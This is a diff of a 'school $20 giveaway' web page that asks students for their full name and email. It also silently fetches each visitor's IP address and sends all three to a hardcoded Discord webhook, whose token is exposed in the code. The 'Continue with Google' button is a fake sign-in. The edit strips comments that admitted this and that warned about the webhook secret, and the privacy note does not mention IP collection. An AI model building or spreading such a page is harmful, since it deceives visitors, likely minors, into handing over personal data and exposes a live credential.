@@ -34,19 +34,17 @@
   }
   .btn-yes { background: linear-gradient(135deg, #00b894, #00cec9); color: white; }
   .btn-no  { background: linear-gradient(135deg, #d63031, #e17055); color: white; }
-  .btn-primary { background: linear-gradient(135deg, #6c5ce7, #a29bfe); color: white; width: 100%; margin: 0; }
+  .btn-primary { background: linear-gradient(135deg, #6c5ce7, #a29bfe); color: white; width: 100%; margin: 4px 0; }
   .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
   .btn:active { transform: translateY(0); }
   input {
     width: 100%; padding: 12px 16px; border-radius: 10px; margin-bottom: 14px;
     background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
-    color: white; font-size: 1rem; outline: none;
-    transition: border-color 0.2s;
+    color: white; font-size: 1rem; outline: none; transition: border-color 0.2s;
   }
   input::placeholder { color: rgba(255,255,255,0.4); }
   input:focus { border-color: #a29bfe; }
   .error { color: #ff7675; font-size: 0.88rem; margin-bottom: 12px; min-height: 20px; }
-  .success { color: #55efc4; font-size: 1rem; }
   .step { display: none; }
   .step.active { display: block; }
   .or-divider { color: #888; margin: 10px 0; font-size: 0.85rem; }
@@ -57,18 +55,18 @@
     border: none; margin-bottom: 14px; transition: box-shadow 0.2s;
   }
   .google-btn:hover { box-shadow: 0 4px 14px rgba(0,0,0,0.3); }
-  .google-icon { width: 20px; height: 20px; }
   .privacy-note { font-size: 0.75rem; color: #888; margin-top: 14px; }
-  .spinner { display: none; margin: 10px auto; width: 28px; height: 28px;
+  .spinner {
+    display: none; margin: 16px auto; width: 32px; height: 32px;
     border: 3px solid rgba(255,255,255,0.2); border-top-color: #a29bfe;
-    border-radius: 50%; animation: spin 0.7s linear infinite; }
+    border-radius: 50%; animation: spin 0.7s linear infinite;
+  }
   @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 <div class="card">
 
-  <!-- Step 0: Intro -->
   <div class="step active" id="step0">
     <div class="emoji">💸</div>
     <h1>$20 Giveaway!</h1>
@@ -78,30 +76,27 @@
     <button class="btn btn-no"  onclick="answer(false)">❌ No</button>
   </div>
 
-  <!-- Step 1: Not eligible -->
   <div class="step" id="step1">
     <div class="emoji">😔</div>
     <h1>Sorry!</h1>
-    <p class="question">You need to be in my school to enter this giveaway. Better luck next time!</p>
+    <p class="question">You need to be in my school to enter. Better luck next time!</p>
   </div>
 
-  <!-- Step 2: Name input -->
   <div class="step" id="step2">
     <div class="emoji">✏️</div>
     <h1>Let's Go!</h1>
-    <p class="subtitle">Fill in your details to enter</p>
-    <input type="text" id="nameInput" placeholder="Your full name (e.g. John Smith)" />
+    <p class="subtitle">What's your full name?</p>
+    <input type="text" id="nameInput" placeholder="e.g. John Smith" />
     <div class="error" id="nameError"></div>
     <button class="btn btn-primary" onclick="submitName()">Continue →</button>
   </div>
 
-  <!-- Step 3: Email or Google -->
   <div class="step" id="step3">
     <div class="emoji">📧</div>
     <h1>Almost There!</h1>
-    <p class="subtitle">How do you want to verify your entry?</p>
+    <p class="subtitle">How do you want to verify?</p>
     <button class="google-btn" onclick="continueWithGoogle()">
-      <svg class="google-icon" viewBox="0 0 48 48">
+      <svg width="20" height="20" viewBox="0 0 48 48">
         <path fill="#EA4335" d="M24 9.5c3.1 0 5.8 1.1 8 2.9l6-6C34.5 3.2 29.6 1 24 1 14.8 1 7 6.7 3.7 14.6l7 5.4C12.4 13.8 17.7 9.5 24 9.5z"/>
         <path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.4 5.7c4.3-4 6.9-9.9 6.9-16.9z"/>
         <path fill="#FBBC05" d="M10.7 28.5A14.5 14.5 0 0 1 9.5 24c0-1.6.3-3.1.7-4.5l-7-5.4A23.8 23.8 0 0 0 .5 24c0 3.9.9 7.5 2.7 10.7l7.5-6.2z"/>
@@ -109,71 +104,69 @@
       </svg>
       Continue with Google
     </button>
-    <div class="or-divider">— or enter your email manually —</div>
+    <div class="or-divider">— or enter your email —</div>
     <input type="email" id="emailInput" placeholder="your@email.com" />
     <div class="error" id="emailError"></div>
     <button class="btn btn-primary" onclick="submitEmail()">Enter Giveaway 🎉</button>
-    <p class="privacy-note">Your name, email, and entry info are collected for giveaway purposes only.</p>
+    <p class="privacy-note">Your info is only used for giveaway purposes.</p>
   </div>
 
-  <!-- Step 4: Success -->
   <div class="step" id="step4">
+    <div class="emoji">⏳</div>
+    <h1>Submitting...</h1>
+    <div class="spinner" style="display:block"></div>
+  </div>
+
+  <div class="step" id="step5">
     <div class="emoji">🎉</div>
     <h1 style="color:#55efc4">You're In!</h1>
-    <p class="success">Your entry has been submitted. Good luck! 🤞</p>
-    <div class="spinner" id="spinner"></div>
+    <p style="color:#aaa; margin-top:10px;">Your entry was submitted. Good luck! 🤞</p>
+  </div>
+
+  <div class="step" id="step6">
+    <div class="emoji">⚠️</div>
+    <h1 style="color:#ff7675">Error</h1>
+    <p id="errorMsg" style="color:#aaa; margin-top:10px;"></p>
   </div>
 
 </div>
 
 <script>
-  // ⚠️ Replace this with your actual webhook URL (keep it secret / server-side in production)
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1486463149627408495/G5fliH-RomkqWggnL2o2lUej33U9HkIVfZKqOn3IGsO4ogu0ouK4kmCqLLDKqX_b0yfx";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1486480928552390669/t5NII-H9nSAdrbmJFJHymbxoRFL1E2n5cVmDw5TIouSGSlIuhoD3X6uyxZYydreFtTeZ";
 
-  // Known fake / random-looking name patterns
   const FAKE_PATTERNS = [
-    /^(.)\1{3,}/i,              // repeated chars: aaaa, bbbbb
-    /[^a-z\s'\-\.]/i,           // non-name characters
-    /^[a-z]{10,}$/i,            // single word 10+ random chars like "aisdunaoid"
-    /^(john\s?doe|jane\s?doe|test\s?user|fake\s?name|asdf|qwerty)/i,
-    /^[bcdfghjklmnpqrstvwxz]{4,}$/i,  // consonant-heavy gibberish
+    /^(.)\1{3,}/i,
+    /^[a-z]{10,}$/i,
+    /^(john\s?doe|jane\s?doe|test|asdf|qwerty|fake)/i,
+    /^[bcdfghjklmnpqrstvwxz]{4,}$/i,
   ];
 
   function isLikelyFake(name) {
-    const trimmed = name.trim();
-    if (trimmed.split(/\s+/).length < 2) return true; // must have first + last
-    for (const p of FAKE_PATTERNS) {
-      if (p.test(trimmed)) return true;
-    }
-    // Check if name parts look like real words (at least 2 letters each)
-    const parts = trimmed.split(/\s+/);
-    for (const part of parts) {
+    const t = name.trim();
+    if (t.split(/\s+/).length < 2) return true;
+    for (const p of FAKE_PATTERNS) if (p.test(t)) return true;
+    for (const part of t.split(/\s+/)) {
       if (part.length < 2) return true;
-      const vowels = (part.match(/[aeiou]/gi) || []).length;
-      if (vowels === 0 && part.length > 2) return true; // no vowels = gibberish
+      if ((part.match(/[aeiou]/gi) || []).length === 0 && part.length > 2) return true;
     }
     return false;
   }
 
   let entrantName = "";
-  let entryMethod = "";
 
   function showStep(id) {
     document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
     document.getElementById(id).classList.add('active');
   }
 
-  function answer(isYes) {
-    if (isYes) showStep('step2');
-    else showStep('step1');
-  }
+  function answer(yes) { showStep(yes ? 'step2' : 'step1'); }
 
   function submitName() {
     const name = document.getElementById('nameInput').value.trim();
-    const err  = document.getElementById('nameError');
+    const err = document.getElementById('nameError');
     if (!name) { err.textContent = "Please enter your full name."; return; }
     if (isLikelyFake(name)) {
-      err.textContent = "😏 Can't trick me — that looks like a fake name! Enter your real full name.";
+      err.textContent = "😏 Can't trick me — that looks fake! Use your real name.";
       return;
     }
     err.textContent = "";
@@ -181,16 +174,11 @@
     showStep('step3');
   }
 
-  async function continueWithGoogle() {
-    entryMethod = "Google (simulated)";
-    // In a real app you'd use Google OAuth here
-    // For now we'll just proceed as if verified
-    await submitEntry("google-verified@school.edu");
-  }
+  async function continueWithGoogle() { await submitEntry("Google Sign-In"); }
 
   async function submitEmail() {
     const email = document.getElementById('emailInput').value.trim();
-    const err   = document.getElementById('emailError');
+    const err = document.getElementById('emailError');
     if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
       err.textContent = "Please enter a valid email address.";
       return;
@@ -199,67 +187,59 @@
     await submitEntry(email);
   }
 
-  async function submitEntry(email) {
-    entryMethod = email.includes("google-verified") ? "Google Sign-In" : "Email";
+  async function submitEntry(method) {
     showStep('step4');
-    document.getElementById('spinner').style.display = 'block';
 
-    // Get IP
     let ip = "Unknown";
     try {
       const r = await fetch("https://api.ipify.org?format=json");
-      const d = await r.json();
-      ip = d.ip;
+      ip = (await r.json()).ip;
     } catch {}
 
-    const now = new Date().toLocaleString("en-US", { timeZone: "America/New_York" });
+    const seen = JSON.parse(localStorage.getItem('gw_ips') || '[]');
+    const duplicate = seen.includes(ip);
 
-    // Build Discord message
-    const payload = {
+    const now = new Date().toLocaleString("en-US", {
+      timeZone: "America/New_York", dateStyle: "full", timeStyle: "short"
+    });
+
+    const body = JSON.stringify({
       embeds: [{
-        title: "🎉 New $20 Giveaway Entry",
-        color: 0x6c5ce7,
+        title: duplicate ? "⚠️ Possible Duplicate Entry" : "🎉 New Giveaway Entry",
+        color: duplicate ? 0xe17055 : 0x6c5ce7,
+        description: duplicate ? "**This IP has entered before — likely the same person.**" : null,
         fields: [
-          { name: "👤 Name",         value: entrantName,  inline: true  },
-          { name: "📧 Email/Method", value: email,        inline: true  },
-          { name: "📅 Date & Time",  value: now,          inline: false },
-          { name: "🌐 IP Address",   value: ip,           inline: true  },
+          { name: "👤 Name",         value: entrantName, inline: true  },
+          { name: "📧 Email/Method", value: method,      inline: true  },
+          { name: "📅 Date & Time",  value: now,         inline: false },
+          { name: "🌐 IP Address",   value: `\`${ip}\``, inline: true  },
         ],
         footer: { text: "Giveaway Entry System" },
         timestamp: new Date().toISOString()
       }]
-    };
+    });
 
     try {
       const res = await fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+        body
       });
 
-      // Discord returns 429 if rate-limited (multiple entries from same person)
-      if (res.status === 429) {
-        payload.embeds[0].color = 0xe17055;
-        payload.embeds[0].title = "⚠️ Possible Duplicate Entry";
-        payload.embeds[0].description = "This entry may be from the same person as a recent entry (rate limited).";
-        await fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
+      if (res.ok || res.status === 204) {
+        if (!duplicate) { seen.push(ip); localStorage.setItem('gw_ips', JSON.stringify(seen)); }
+        showStep('step5');
+      } else {
+        document.getElementById('errorMsg').textContent =
+          `Discord returned status ${res.status}. The webhook may be invalid or deleted.`;
+        showStep('step6');
       }
     } catch (e) {
-      console.error("Webhook error:", e);
+      document.getElementById('errorMsg').textContent =
+        `Could not reach Discord: ${e.message}. Make sure you're online and the webhook URL is correct.`;
+      showStep('step6');
     }
-
-    document.getElementById('spinner').style.display = 'none';
   }
-
-  // Track multiple submissions using localStorage
-  window.addEventListener('load', () => {
-    const entries = JSON.parse(localStorage.getItem('giveawayEntries') || '[]');
-    window._giveawayEntries = entries;
-  });
 </script>
 </body>
 </html>
